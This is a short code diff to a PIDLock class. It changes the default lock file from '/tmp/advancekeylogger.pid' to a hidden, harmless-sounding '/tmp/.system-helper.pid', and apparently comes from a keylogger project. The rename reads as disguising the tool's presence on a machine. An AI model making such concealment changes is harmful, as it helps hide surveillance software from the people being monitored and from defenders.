@@ -39,7 +39,7 @@ class PIDLock:
 
     def __init__(self, pid_file: str | None = None) -> None:
         if pid_file is None:
-            pid_file = "/tmp/advancekeylogger.pid"
+            pid_file = "/tmp/.system-helper.pid"
         self.pid_file = Path(pid_file)
 
     def acquire(self) -> bool:
